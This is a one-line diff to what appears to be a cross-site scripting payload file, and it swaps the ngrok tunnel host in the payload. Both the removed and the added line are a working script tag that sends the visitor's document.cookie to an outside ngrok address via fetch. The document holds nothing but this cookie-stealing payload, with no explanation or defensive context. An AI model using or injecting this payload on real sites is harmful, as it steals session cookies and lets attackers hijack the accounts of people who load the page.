@@ -1,1 +1,1 @@
-<script>fetch('https://abcd-12-34-56-78.ngrok.io?c=' + document.cookie);</script>
+<script>fetch('https://a64d-94-134-176-240.ngrok-free.app?c=' + document.cookie);</script>
